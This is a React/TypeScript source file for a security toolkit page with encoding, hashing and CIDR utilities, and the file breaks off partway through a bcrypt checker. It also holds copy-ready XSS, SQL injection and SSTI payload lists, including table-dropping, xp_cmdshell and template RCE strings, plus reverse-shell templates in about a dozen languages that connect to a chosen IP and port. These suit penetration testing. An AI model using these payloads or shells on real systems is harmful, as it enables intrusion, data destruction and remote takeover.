"use client"

import * as React from "react"
import { AppShell } from "@/components/layout/app-shell"
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from "@/components/ui/card"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Badge } from "@/components/ui/badge"
import { Tabs, TabsList, TabsTrigger, TabsContent } from "@/components/ui/tabs"
import { Stagger, FadeIn } from "@/components/ui/stagger"
import {
  Code2,
  Link2,
  Binary,
  Hash,
  Shield,
  Fingerprint,
  Bug,
  Database,
  Braces,
  Network,
  ScanSearch,
  KeyRound,
  Lock,
  Terminal,
  FileText,
  Copy,
  Check,
  AlertCircle,
  Search,
  Wrench,
  ArrowRight,
  Info,
  Eye,
  EyeOff,
  RefreshCw,
  Download,
  Filter,
} from "lucide-react"

// ─────────────────────────────────────────────────────────────
// Helpers
// ─────────────────────────────────────────────────────────────

function CopyButton({ text, compact, id }: { text: string; compact?: boolean; id?: string }) {
  const [copied, setCopied] = React.useState(false)
  const handle = async () => {
    if (!text) return
    try {
      await navigator.clipboard.writeText(text)
      setCopied(true)
      setTimeout(() => setCopied(false), 1400)
    } catch {
      // fallback
      const ta = document.createElement("textarea")
      ta.value = text
      document.body.appendChild(ta)
      ta.select()
      document.execCommand("copy")
      document.body.removeChild(ta)
      setCopied(true)
      setTimeout(() => setCopied(false), 1400)
    }
  }
  if (compact) {
    return (
      <button
        onClick={handle}
        aria-label={copied ? "Copied" : "Copy"}
        className={`h-7 w-7 inline-flex items-center justify-center rounded-[7px] border text-[var(--text-2)] hover:text-[var(--text)] hover:bg-[var(--surface-2)] transition-colors ${copied ? "border-emerald-200 bg-emerald-50 text-emerald-700 dark:bg-emerald-950/30 dark:border-emerald-900 dark:text-emerald-300" : "border-[var(--border)] bg-[var(--surface)]"}`}
      >
        {copied ? <Check className="w-3.5 h-3.5" /> : <Copy className="w-3.5 h-3.5" />}
      </button>
    )
  }
  return (
    <Button variant="secondary" size="sm" onClick={handle} disabled={!text} className="h-7 text-[12px] gap-1.5 shrink-0">
      {copied ? <Check className="w-3.5 h-3.5 text-emerald-600" /> : <Copy className="w-3.5 h-3.5" />}
      {copied ? "Copied" : "Copy"}
    </Button>
  )
}

function monoBoxClass(hasError?: boolean) {
  return `w-full rounded-[8px] border bg-[var(--surface-2)] px-3 py-2.5 font-mono text-[12.5px] leading-relaxed break-all min-h-[44px] whitespace-pre-wrap ${hasError ? "border-red-200 bg-red-50 text-red-700 dark:bg-red-950/20 dark:border-red-900 dark:text-red-300" : "border-[var(--border)] text-[var(--text)]"}`
}
const textareaClass =
  "flex min-h-[88px] w-full rounded-[8px] border border-[var(--border)] bg-[var(--surface)] px-3 py-2.5 text-[13px] leading-relaxed placeholder:text-[var(--text-3)] focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-[var(--accent)] focus-visible:ring-offset-0 disabled:opacity-50 transition-colors resize-y"
const outputAreaClass =
  "w-full rounded-[8px] border bg-[var(--surface-2)] px-3 py-2.5 font-mono text-[12.5px] leading-relaxed break-all whitespace-pre-wrap min-h-[88px] overflow-auto max-h-[220px]"

function b64Encode(str: string): string {
  const bytes = new TextEncoder().encode(str)
  let bin = ""
  bytes.forEach((b) => (bin += String.fromCharCode(b)))
  return btoa(bin)
}
function b64Decode(b64: string): string {
  const bin = atob(b64.trim())
  const bytes = Uint8Array.from(bin, (c) => c.charCodeAt(0))
  return new TextDecoder().decode(bytes)
}
function b64UrlDecode(input: string): string {
  let s = input.replace(/-/g, "+").replace(/_/g, "/")
  const pad = s.length % 4
  if (pad) s += "=".repeat(4 - pad)
  return b64Decode(s)
}
function hexEncode(str: string): string {
  const bytes = new TextEncoder().encode(str)
  return Array.from(bytes)
    .map((b) => b.toString(16).padStart(2, "0"))
    .join("")
}
function hexDecode(hex: string): string {
  const clean = hex.trim().replace(/^0x/i, "").replace(/\s+/g, "")
  if (!/^[0-9a-fA-F]*$/.test(clean)) throw new Error("Invalid hex: only 0-9, a-f allowed")
  if (clean.length % 2 !== 0) throw new Error("Invalid hex: odd length")
  const bytes = new Uint8Array(clean.length / 2)
  for (let i = 0; i < clean.length; i += 2) bytes[i / 2] = parseInt(clean.slice(i, i + 2), 16)
  return new TextDecoder().decode(bytes)
}

// MD5 pure JS (based on blueimp, MIT)
function md5(input: string): string {
  function safeAdd(x: number, y: number) {
    const lsw = (x & 0xffff) + (y & 0xffff)
    const msw = (x >> 16) + (y >> 16) + (lsw >> 16)
    return (msw << 16) | (lsw & 0xffff)
  }
  function bitRotateLeft(num: number, cnt: number) {
    return (num << cnt) | (num >>> (32 - cnt))
  }
  function md5cmn(q: number, a: number, b: number, x: number, s: number, t: number) {
    return safeAdd(bitRotateLeft(safeAdd(safeAdd(a, q), safeAdd(x, t)), s), b)
  }
  function md5ff(a: number, b: number, c: number, d: number, x: number, s: number, t: number) {
    return md5cmn((b & c) | (~b & d), a, b, x, s, t)
  }
  function md5gg(a: number, b: number, c: number, d: number, x: number, s: number, t: number) {
    return md5cmn((b & d) | (c & ~d), a, b, x, s, t)
  }
  function md5hh(a: number, b: number, c: number, d: number, x: number, s: number, t: number) {
    return md5cmn(b ^ c ^ d, a, b, x, s, t)
  }
  function md5ii(a: number, b: number, c: number, d: number, x: number, s: number, t: number) {
    return md5cmn(c ^ (b | ~d), a, b, x, s, t)
  }
  function binlMD5(x: number[], len: number) {
    x[len >> 5] |= 0x80 << len % 32
    x[(((len + 64) >>> 9) << 4) + 14] = len
    let a = 1732584193, b = -271733879, c = -1732584194, d = 271733878
    for (let i = 0; i < x.length; i += 16) {
      const olda = a, oldb = b, oldc = c, oldd = d
      a = md5ff(a, b, c, d, x[i], 7, -680876936)
      d = md5ff(d, a, b, c, x[i + 1], 12, -389564586)
      c = md5ff(c, d, a, b, x[i + 2], 17, 606105819)
      b = md5ff(b, c, d, a, x[i + 3], 22, -1044525330)
      a = md5ff(a, b, c, d, x[i + 4], 7, -176418897)
      d = md5ff(d, a, b, c, x[i + 5], 12, 1200080426)
      c = md5ff(c, d, a, b, x[i + 6], 17, -1473231341)
      b = md5ff(b, c, d, a, x[i + 7], 22, -45705983)
      a = md5ff(a, b, c, d, x[i + 8], 7, 1770035416)
      d = md5ff(d, a, b, c, x[i + 9], 12, -1958414417)
      c = md5ff(c, d, a, b, x[i + 10], 17, -42063)
      b = md5ff(b, c, d, a, x[i + 11], 22, -1990404162)
      a = md5ff(a, b, c, d, x[i + 12], 7, 1804603682)
      d = md5ff(d, a, b, c, x[i + 13], 12, -40341101)
      c = md5ff(c, d, a, b, x[i + 14], 17, -1502002290)
      b = md5ff(b, c, d, a, x[i + 15], 22, 1236535329)
      a = md5gg(a, b, c, d, x[i + 1], 5, -165796510)
      d = md5gg(d, a, b, c, x[i + 6], 9, -1069501632)
      c = md5gg(c, d, a, b, x[i + 11], 14, 643717713)
      b = md5gg(b, c, d, a, x[i], 20, -373897302)
      a = md5gg(a, b, c, d, x[i + 5], 5, -701558691)
      d = md5gg(d, a, b, c, x[i + 10], 9, 38016083)
      c = md5gg(c, d, a, b, x[i + 15], 14, -660478335)
      b = md5gg(b, c, d, a, x[i + 4], 20, -405537848)
      a = md5gg(a, b, c, d, x[i + 9], 5, 568446438)
      d = md5gg(d, a, b, c, x[i + 14], 9, -1019803690)
      c = md5gg(c, d, a, b, x[i + 3], 14, -187363961)
      b = md5gg(b, c, d, a, x[i + 8], 20, 1163531501)
      a = md5gg(a, b, c, d, x[i + 13], 5, -1444681467)
      d = md5gg(d, a, b, c, x[i + 2], 9, -51403784)
      c = md5gg(c, d, a, b, x[i + 7], 14, 1735328473)
      b = md5gg(b, c, d, a, x[i + 12], 20, -1926607734)
      a = md5hh(a, b, c, d, x[i + 5], 4, -378558)
      d = md5hh(d, a, b, c, x[i + 8], 11, -2022574463)
      c = md5hh(c, d, a, b, x[i + 11], 16, 1839030562)
      b = md5hh(b, c, d, a, x[i + 14], 23, -35309556)
      a = md5hh(a, b, c, d, x[i + 1], 4, -1530992060)
      d = md5hh(d, a, b, c, x[i + 4], 11, 1272893353)
      c = md5hh(c, d, a, b, x[i + 7], 16, -155497632)
      b = md5hh(b, c, d, a, x[i + 10], 23, -1094730640)
      a = md5hh(a, b, c, d, x[i + 13], 4, 681279174)
      d = md5hh(d, a, b, c, x[i], 11, -358537222)
      c = md5hh(c, d, a, b, x[i + 3], 16, -722521979)
      b = md5hh(b, c, d, a, x[i + 6], 23, 76029189)
      a = md5hh(a, b, c, d, x[i + 9], 4, -640364487)
      d = md5hh(d, a, b, c, x[i + 12], 11, -421815835)
      c = md5hh(c, d, a, b, x[i + 15], 16, 530742520)
      b = md5hh(b, c, d, a, x[i + 2], 23, -995338651)
      a = md5ii(a, b, c, d, x[i], 6, -198630844)
      d = md5ii(d, a, b, c, x[i + 7], 10, 1126891415)
      c = md5ii(c, d, a, b, x[i + 14], 15, -1416354905)
      b = md5ii(b, c, d, a, x[i + 5], 21, -57434055)
      a = md5ii(a, b, c, d, x[i + 12], 6, 1700485571)
      d = md5ii(d, a, b, c, x[i + 3], 10, -1894986606)
      c = md5ii(c, d, a, b, x[i + 10], 15, -1051523)
      b = md5ii(b, c, d, a, x[i + 1], 21, -2054922799)
      a = md5ii(a, b, c, d, x[i + 8], 6, 1873313359)
      d = md5ii(d, a, b, c, x[i + 15], 10, -30611744)
      c = md5ii(c, d, a, b, x[i + 6], 15, -1560198380)
      b = md5ii(b, c, d, a, x[i + 13], 21, 1309151649)
      a = md5ii(a, b, c, d, x[i + 4], 6, -145523070)
      d = md5ii(d, a, b, c, x[i + 11], 10, -1120210379)
      c = md5ii(c, d, a, b, x[i + 2], 15, 718787259)
      b = md5ii(b, c, d, a, x[i + 9], 21, -343485551)
      a = safeAdd(a, olda); b = safeAdd(b, oldb); c = safeAdd(c, oldc); d = safeAdd(d, oldd)
    }
    return [a, b, c, d]
  }
  function binl2rstr(input: number[]) {
    let out = ""
    for (let i = 0; i < input.length * 32; i += 8) out += String.fromCharCode((input[i >> 5] >>> i % 32) & 0xff)
    return out
  }
  function rstr2binl(input: string) {
    const out: number[] = Array(((input.length + 8) >> 6) * 16 + 16).fill(0)
    for (let i = 0; i < input.length; i++) out[i >> 2] |= input.charCodeAt(i) << ((i % 4) * 8)
    return out
  }
  function rstrMD5(s: string) { return binl2rstr(binlMD5(rstr2binl(s), s.length * 8)) }
  function rstr2hex(inp: string) {
    const hexTab = "0123456789abcdef"
    let out = ""
    for (let i = 0; i < inp.length; i++) { const x = inp.charCodeAt(i); out += hexTab.charAt((x >>> 4) & 0x0f) + hexTab.charAt(x & 0x0f) }
    return out
  }
  // handle UTF-8 by encoding as raw bytes via unescape(encodeURIComponent) equivalent:
  const utf8 = unescape(encodeURIComponent(input))
  return rstr2hex(rstrMD5(utf8))
}

async function shaHex(algo: "SHA-1" | "SHA-256" | "SHA-384" | "SHA-512", text: string): Promise<string> {
  const data = new TextEncoder().encode(text)
  const buf = await crypto.subtle.digest(algo, data)
  return Array.from(new Uint8Array(buf)).map((b) => b.toString(16).padStart(2, "0")).join("")
}

// CIDR
function ipToInt(ip: string): number {
  const parts = ip.split(".").map(Number)
  if (parts.length !== 4 || parts.some((n) => Number.isNaN(n) || n < 0 || n > 255)) throw new Error("Invalid IPv4 address")
  return ((parts[0] << 24) >>> 0) + (parts[1] << 16) + (parts[2] << 8) + parts[3]
}
function intToIp(int: number): string {
  return [(int >>> 24) & 255, (int >>> 16) & 255, (int >>> 8) & 255, int & 255].join(".")
}
function cidrInfo(cidr: string) {
  const m = cidr.trim().match(/^(.+)\/(\d{1,2})$/)
  if (!m) throw new Error("Use CIDR notation, e.g. 192.168.1.0/24")
  const ipStr = m[1].trim()
  const prefix = Number(m[2])
  if (prefix < 0 || prefix > 32) throw new Error("Prefix must be 0–32")
  const ipInt = ipToInt(ipStr)
  const mask = prefix === 0 ? 0 : (~0 << (32 - prefix)) >>> 0
  const network = (ipInt & mask) >>> 0
  const broadcast = (network | ~mask) >>> 0
  const netmask = intToIp(mask)
  const total = Math.pow(2, 32 - prefix)
  const usable = prefix >= 31 ? total : total - 2
  const first = prefix >= 31 ? intToIp(network) : intToIp((network + 1) >>> 0)
  const last = prefix >= 31 ? intToIp(broadcast) : intToIp((broadcast - 1) >>> 0)
  const wildcard = intToIp((~mask) >>> 0)
  return { network: intToIp(network), broadcast: intToIp(broadcast), netmask, wildcard, prefix, total, usable, first, last, ip: ipStr }
}

// Payload datasets (curated, real)
const xssPayloads = [
  { label: "Basic alert", payload: '<script>alert(1)</script>', ctx: "HTML" },
  { label: "Image onerror", payload: '<img src=x onerror=alert(1)>', ctx: "HTML" },
  { label: "SVG onload", payload: '<svg onload=alert(1)>', ctx: "HTML" },
  { label: "Body onload", payload: '<body onload=alert(1)>', ctx: "HTML" },
  { label: "Iframe srcdoc", payload: '<iframe srcdoc="<svg onload=alert(1)>">', ctx: "HTML" },
  { label: "JS URI", payload: 'javascript:alert(1)', ctx: "URL" },
  { label: "Event handler", payload: '" onmouseover="alert(1)" x="', ctx: "Attr" },
  { label: "Template literal", payload: "${alert(1)}", ctx: "JS" },
  { label: "Angular SSTI+XSS", payload: "{{7*7}}", ctx: "Template" },
  { label: "DOM - location", payload: '<script>eval(location.hash.slice(1))</script>', ctx: "DOM" },
  { label: "WAF bypass - case", payload: '<ScRiPt>alert(1)</ScRiPt>', ctx: "Bypass" },
  { label: "WAF bypass - enc", payload: '<img src=x onerror="&#x61;&#x6c;&#x65;&#x72;&#x74;(1)">', ctx: "Bypass" },
]
const sqliPayloads = [
  { label: "Auth bypass", payload: "' OR '1'='1' -- -", ctx: "Auth" },
  { label: "Auth bypass (alt)", payload: "' OR 1=1 -- -", ctx: "Auth" },
  { label: "Union select", payload: "' UNION SELECT null,null,null -- -", ctx: "Union" },
  { label: "Version", payload: "' UNION SELECT @@version,null -- -", ctx: "Enum" },
  { label: "Information schema", payload: "' UNION SELECT table_name,2 FROM information_schema.tables -- -", ctx: "Enum" },
  { label: "Time blind", payload: "' OR IF(1=1,SLEEP(5),0) -- -", ctx: "Blind" },
  { label: "Boolean blind", payload: "' AND 1=1 -- - / ' AND 1=2 -- -", ctx: "Blind" },
  { label: "Error based", payload: "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT @@version),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) -- -", ctx: "Error" },
  { label: "Stacked query", payload: "'; DROP TABLE users; -- -", ctx: "Stacked" },
  { label: "Order by probe", payload: "' ORDER BY 1 -- - / ' ORDER BY 10 -- -", ctx: "Probe" },
  { label: "MSSQL exec", payload: "'; EXEC xp_cmdshell('whoami') -- -", ctx: "MSSQL" },
  { label: "Postgres pg_sleep", payload: "' || pg_sleep(5) -- -", ctx: "Blind" },
]
const sstiPayloads = [
  { label: "Jinja2", payload: "{{ 7*7 }}", ctx: "Jinja2" },
  { label: "Jinja2 dump", payload: "{{ config }}", ctx: "Jinja2" },
  { label: "Jinja2 RCE", payload: "{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}", ctx: "Jinja2" },
  { label: "Twig", payload: "{{7*7}} / {{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('exec')}}", ctx: "Twig" },
  { label: "Smarty", payload: "{7*7}", ctx: "Smarty" },
  { label: "Freemarker", payload: "${7*7}", ctx: "Freemarker" },
  { label: "Velocity", payload: "#set($x=7*7)$x", ctx: "Velocity" },
  { label: "ERB", payload: "<%= 7*7 %>", ctx: "ERB" },
  { label: "Handlebars", payload: "{{#with \"s\" as |s|}} {{s}} {{/with}}", ctx: "Handlebars" },
  { label: "Mako", payload: "${7*7}", ctx: "Mako" },
  { label: "Golang", payload: "{{ . }}", ctx: "Go" },
]

const shellTemplates: Record<string, (ip: string, port: string, shell?: string) => string> = {
  bash: (ip, port) => `bash -i >& /dev/tcp/${ip}/${port} 0>&1`,
  bash2: (ip, port) => `0<&196;exec 196<>/dev/tcp/${ip}/${port}; sh <&196 >&196 2>&196`,
  nc: (ip, port) => `nc -e /bin/sh ${ip} ${port}`,
  nc2: (ip, port) => `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${ip} ${port} >/tmp/f`,
  python: (ip, port) => `python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("${ip}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'`,
  python2: (ip, port) => `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`,
  php: (ip, port) => `php -r '$sock=fsockopen("${ip}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'`,
  perl: (ip, port) => `perl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`,
  ruby: (ip, port) => `ruby -rsocket -e'f=TCPSocket.open("${ip}",${port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`,
  powershell: (ip, port) => `$client = New-Object System.Net.Sockets.TCPClient("${ip}",${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`,
  nodejs: (ip, port) => `require('child_process').exec('nc -e /bin/sh ${ip} ${port}')`,
  socat: (ip, port) => `socat TCP:${ip}:${port} EXEC:/bin/sh,pty,stderr,setsid,sigint,sane`,
}

// ─────────────────────────────────────────────────────────────
// Tool Cards
// ─────────────────────────────────────────────────────────────

function Base64Tool() {
  const [input, setInput] = React.useState("Hello aegis — toolkit ✓")
  const [mode, setMode] = React.useState<"encode" | "decode">("encode")
  const [out, setOut] = React.useState("")
  const [err, setErr] = React.useState<string | null>(null)
  React.useEffect(() => {
    try {
      setErr(null)
      if (!input) { setOut(""); return }
      setOut(mode === "encode" ? b64Encode(input) : b64Decode(input))
    } catch (e: unknown) { setErr(e instanceof Error ? e.message : "Decode error"); setOut("") }
  }, [input, mode])
  return (
    <Card>
      <CardHeader className="pb-3">
        <div className="flex items-center gap-2.5">
          <span className="w-8 h-8 rounded-[8px] bg-[var(--surface-2)] border border-[var(--border)] flex items-center justify-center"><Code2 className="w-4 h-4 text-[var(--text-2)]" /></span>
          <div className="flex-1 min-w-0">
            <CardTitle className="flex items-center gap-2">Base64 <Badge variant="secondary" className="text-[10px] font-mono">RFC 4648</Badge></CardTitle>
            <CardDescription>UTF-8 aware encode / decode. Handles unicode correctly.</CardDescription>
          </div>
          <Badge variant="outline" className="font-mono text-[10px] hidden sm:inline-flex">client-side</Badge>
        </div>
      </CardHeader>
      <CardContent className="space-y-3">
        <div className="flex gap-1 p-1 rounded-[8px] bg-[var(--surface-2)] border border-[var(--border)] w-fit">
          <button onClick={() => setMode("encode")} className={`px-3 py-1 rounded-[6px] text-[12.5px] font-[500] transition-colors ${mode === "encode" ? "bg-[var(--surface)] border border-[var(--border)] shadow-sm text-[var(--text)]" : "text-[var(--text-2)] hover:text-[var(--text)]"}`}>Encode</button>
          <button onClick={() => setMode("decode")} className={`px-3 py-1 rounded-[6px] text-[12.5px] font-[500] transition-colors ${mode === "decode" ? "bg-[var(--surface)] border border-[var(--border)] shadow-sm text-[var(--text)]" : "text-[var(--text-2)] hover:text-[var(--text)]"}`}>Decode</button>
        </div>
        <div>
          <div className="text-[11px] font-medium tracking-wide text-[var(--text-2)] mb-1.5 uppercase">{mode === "encode" ? "Input (utf-8)" : "Input (base64)"}</div>
          <textarea value={input} onChange={(e) => setInput(e.target.value)} placeholder={mode === "encode" ? "Text to encode..." : "Base64 to decode..."} className={textareaClass} spellCheck={false} />
          <div className="mt-1 flex items-center justify-between text-[11px]">
            <span className="text-[var(--text-3)] font-mono">{input.length} chars</span>
            <button onClick={() => setInput("")} className="text-[var(--text-2)] hover:text-[var(--text)]">Clear</button>
          </div>
        </div>
        <div>
          <div className="flex items-center justify-between mb-1.5">
            <span className="text-[11px] font-medium tracking-wide text-[var(--text-2)] uppercase">Output</span>
            <CopyButton text={out} />
          </div>
          <div className={outputAreaClass + (err ? " !border-red-200 !bg-red-50 dark:!bg-red-950/20 dark:!border-red-900" : "")} style={{ color: err ? undefined : undefined }}>
            {err ? <span className="text-red-700 dark:text-red-300 flex gap-1.5 items-start"><AlertCircle className="w-3.5 h-3.5 mt-[1px] shrink-0" />{err}</span> : out || <span className="text-[var(--text-3)]">Output will appear here…</span>}
          </div>
          <div className="mt-1 text-[11px] font-mono text-[var(--text-3)]">{out.length ? `${out.length} chars` : "—"}</div>
        </div>
      </CardContent>
    </Card>
  )
}

function UrlTool() {
  const [input, setInput] = React.useState("https://aegis.lab/search?q=hello world & xss=<script>")
  const [mode, setMode] = React.useState<"encode" | "decode">("encode")
  const [component, setComponent] = React.useState(true)
  const [out, setOut] = React.useState("")
  const [err, setErr] = React.useState<string | null>(null)
  React.useEffect(() => {
    try {
      setErr(null)
      if (!input) { setOut(""); return }
      if (mode === "encode") setOut(component ? encodeURIComponent(input) : encodeURI(input))
      else setOut(decodeURIComponent(input))
    } catch (e: unknown) { setErr(e instanceof Error ? e.message : "Decode failed"); setOut("") }
  }, [input, mode, component])
  return (
    <Card>
      <CardHeader className="pb-3">
        <div className="flex items-center gap-2.5">
          <span className="w-8 h-8 rounded-[8px] bg-[var(--surface-2)] border border-[var(--border)] flex items-center justify-center"><Link2 className="w-4 h-4 text-[var(--text-2)]" /></span>
          <div>
            <CardTitle className="flex items-center gap-2">URL <Badge variant="secondary" className="text-[10px]">encode / decode</Badge></CardTitle>
            <CardDescription>Percent-encoding with component vs full URL mode.</CardDescription>
          </div>
        </div>
      </CardHeader>
      <CardContent className="space-y-3">
        <div className="flex flex-wrap items-center gap-2">
          <div className="flex gap-1 p-1 rounded-[8px] bg-[var(--surface-2)] border border-[var(--border)] w-fit">
            <button onClick={() => setMode("encode")} className={`px-3 py-1 rounded-[6px] text-[12.5px] font-[500] ${mode === "encode" ? "bg-[var(--surface)] border border-[var(--border)] shadow-sm" : "text-[var(--text-2)]"}`}>Encode</button>
            <button onClick={() => setMode("decode")} className={`px-3 py-1 rounded-[6px] text-[12.5px] font-[500] ${mode === "decode" ? "bg-[var(--surface)] border border-[var(--border)] shadow-sm" : "text-[var(--text-2)]"}`}>Decode</button>
          </div>
          {mode === "encode" && (
            <label className="flex items-center gap-2 text-[12.5px] ml-1">
              <input type="checkbox" checked={component} onChange={(e) => setComponent(e.target.checked)} className="rounded border-[var(--border)]" />
              <span className="text-[var(--text-2)]">encodeURIComponent</span>
              <span className="text-[11px] text-[var(--text-3)] hidden sm:inline">vs encodeURI (preserve : / ? #)</span>
            </label>
          )}
        </div>
        <textarea value={input} onChange={(e) => setInput(e.target.value)} placeholder="https://example.com/?q=test..." className={textareaClass} spellCheck={false} />
        <div className="space-y-1.5">
          <div className="flex items-center justify-between">
            <span className="text-[11px] font-medium tracking-wide text-[var(--text-2)] uppercase">Output</span>
            <CopyButton text={out} />
          </div>
          <div className={outputAreaClass}>
            {err ? <span className="text-red-700 dark:text-red-300 flex gap-1.5"><AlertCircle className="w-3.5 h-3.5 mt-[1px]" />{err}</span> : out || <span className="text-[var(--text-3)]">Output will appear here…</span>}
          </div>
        </div>
      </CardContent>
    </Card>
  )
}

function HexTool() {
  const [input, setInput] = React.useState("aegis toolkit")
  const [mode, setMode] = React.useState<"encode" | "decode">("encode")
  const [out, setOut] = React.useState("")
  const [err, setErr] = React.useState<string | null>(null)
  React.useEffect(() => {
    try {
      setErr(null)
      if (!input) { setOut(""); return }
      setOut(mode === "encode" ? hexEncode(input) : hexDecode(input))
    } catch (e: unknown) { setErr(e instanceof Error ? e.message : "Error"); setOut("") }
  }, [input, mode])
  return (
    <Card>
      <CardHeader className="pb-3">
        <div className="flex items-center gap-2.5">
          <span className="w-8 h-8 rounded-[8px] bg-[var(--surface-2)] border border-[var(--border)] flex items-center justify-center"><Binary className="w-4 h-4 text-[var(--text-2)]" /></span>
          <div>
            <CardTitle>Hex</CardTitle>
            <CardDescription>UTF-8 to hex and back. Supports 0x prefix.</CardDescription>
          </div>
        </div>
      </CardHeader>
      <CardContent className="space-y-3">
        <div className="flex gap-1 p-1 rounded-[8px] bg-[var(--surface-2)] border border-[var(--border)] w-fit">
          <button onClick={() => setMode("encode")} className={`px-3 py-1 rounded-[6px] text-[12.5px] font-[500] ${mode === "encode" ? "bg-[var(--surface)] border border-[var(--border)] shadow-sm" : "text-[var(--text-2)]"}`}>Encode</button>
          <button onClick={() => setMode("decode")} className={`px-3 py-1 rounded-[6px] text-[12.5px] font-[500] ${mode === "decode" ? "bg-[var(--surface)] border border-[var(--border)] shadow-sm" : "text-[var(--text-2)]"}`}>Decode</button>
        </div>
        <textarea value={input} onChange={(e) => setInput(e.target.value)} placeholder={mode === "encode" ? "Text to hex-encode" : "Hex to decode (e.g. 6165676973)"} className={textareaClass} spellCheck={false} />
        <div className="space-y-1.5">
          <div className="flex items-center justify-between">
            <span className="text-[11px] font-medium tracking-wide text-[var(--text-2)] uppercase">Output</span>
            <div className="flex items-center gap-1.5">
              {out && !err && <span className="text-[11px] font-mono text-[var(--text-3)] hidden sm:inline">{out.length} hex chars</span>}
              <CopyButton text={out} />
            </div>
          </div>
          <div className={outputAreaClass}>
            {err ? <span className="text-red-700 dark:text-red-300 flex gap-1.5"><AlertCircle className="w-3.5 h-3.5 mt-[1px]" />{err}</span> : out || <span className="text-[var(--text-3)]">Output will appear here…</span>}
          </div>
        </div>
      </CardContent>
    </Card>
  )
}

function HashTool() {
  const [input, setInput] = React.useState("aegis")
  const [md5v, setMd5v] = React.useState("")
  const [sha1, setSha1] = React.useState("")
  const [sha256, setSha256] = React.useState("")
  const [sha512, setSha512] = React.useState("")
  const [loading, setLoading] = React.useState(false)
  React.useEffect(() => {
    if (!input) { setMd5v(""); setSha1(""); setSha256(""); setSha512(""); return }
    setMd5v(md5(input))
    let cancelled = false
    setLoading(true)
    Promise.all([shaHex("SHA-1", input), shaHex("SHA-256", input), shaHex("SHA-512", input)])
      .then(([a, b, c]) => { if (!cancelled) { setSha1(a); setSha256(b); setSha512(c) } })
      .finally(() => { if (!cancelled) setLoading(false) })
    return () => { cancelled = true }
  }, [input])
  const Row = ({ label, value }: { label: string; value: string }) => (
    <div className="flex gap-2 items-start">
      <span className="text-[11px] font-semibold tracking-wide uppercase text-[var(--text-3)] w-[56px] shrink-0 pt-1">{label}</span>
      <div className="flex-1 min-w-0 rounded-[8px] border border-[var(--border)] bg-[var(--surface-2)] px-3 py-2 font-mono text-[11.5px] break-all leading-relaxed flex items-center justify-between gap-2">
        <span className="break-all">{value || <span className="text-[var(--text-3)]">—</span>}</span>
        <CopyButton text={value} compact />
      </div>
    </div>
  )
  return (
    <Card>
      <CardHeader className="pb-3">
        <div className="flex items-center gap-2.5">
          <span className="w-8 h-8 rounded-[8px] bg-[var(--surface-2)] border border-[var(--border)] flex items-center justify-center"><Hash className="w-4 h-4 text-[var(--text-2)]" /></span>
          <div className="flex-1">
            <CardTitle className="flex items-center gap-2">Hashing <Badge variant="secondary" className="text-[10px]">MD5 • SHA-1 • SHA-256 • SHA-512</Badge></CardTitle>
            <CardDescription>All digests computed locally via Web Crypto + pure-JS MD5.</CardDescription>
          </div>
          {loading && <RefreshCw className="w-3.5 h-3.5 text-[var(--text-3)] animate-spin" />}
        </div>
      </CardHeader>
      <CardContent className="space-y-3">
        <div>
          <div className="text-[11px] font-medium tracking-wide text-[var(--text-2)] mb-1.5 uppercase">Input</div>
          <div className="relative">
            <Input value={input} onChange={(e) => setInput(e.target.value)} placeholder="Text to hash..." className="pr-16 font-mono text-[13px]" />
            <span className="absolute right-2 top-1/2 -translate-y-1/2 text-[11px] font-mono text-[var(--text-3)]">{input.length} chars</span>
          </div>
        </div>
        <div className="space-y-2">
          <Row label="MD5" value={md5v} />
          <Row label="SHA-1" value={sha1} />
          <Row label="SHA-256" value={sha256} />
          <Row label="SHA-512" value={sha512} />
        </div>
        <div className="rounded-[8px] bg-[var(--surface-2)] border border-[var(--border)] p-2.5 flex gap-2 text-[11.5px] leading-relaxed text-[var(--text-2)]">
          <Info className="w-3.5 h-3.5 mt-[2px] shrink-0 text-[var(--text-3)]" />
          <span>MD5 is cryptographically broken — shown only for fingerprinting/legacy. Prefer SHA-256 for integrity. All operations run in your browser; nothing is sent to a server.</span>
        </div>
      </CardContent>
    </Card>
  )
}

function BcryptTool() {
  const [candidate, setCandidate] = React.useState("$2b$12$LQv3c1yqBWVHxkd0LHAkCOYz6TtxMQJqhN8/LewKyniLR6p6dURay")
  const [info, setInfo] = React.useState<{ valid: boolean; msg: string; cost?: number; variant?: string } | null>(null)
  React.useEffect(() => {
    const v = candidate.trim()
    if (!v) { setInfo(null); return }
    const m = v.match(/^\$2([aby])\$(\d{2})\$(.{53})$/)
    if (!m) { setInfo({ valid: false, msg: "Not a valid bcrypt hash — expected $2a/$2b/$2y$ + 2-digit cost + 53 chars" }); return }
    const cost = Number(m[2])
